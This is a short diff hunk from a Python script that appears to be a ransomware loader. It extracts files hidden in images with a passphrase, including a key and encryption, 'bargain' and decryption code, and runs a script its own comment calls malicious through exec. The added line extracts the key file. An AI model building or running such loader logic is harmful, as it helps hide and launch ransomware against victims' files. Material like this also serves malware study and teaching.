@@ -23,6 +23,7 @@ def main():
     decrypt_code_found: bool = os.path.exists(image_containing_decryption_code)
     try:
         if key_found and encrypt_code_found and bargain_code_found and decrypt_code_found:
+            extract_file(image_containing_key, passphrase)
             code_to_encrypt: str = extract_file(image_containing_encryption_code, passphrase)
             # Runs the malicious script (our "encrypt.py")
             exec("import encrypt")
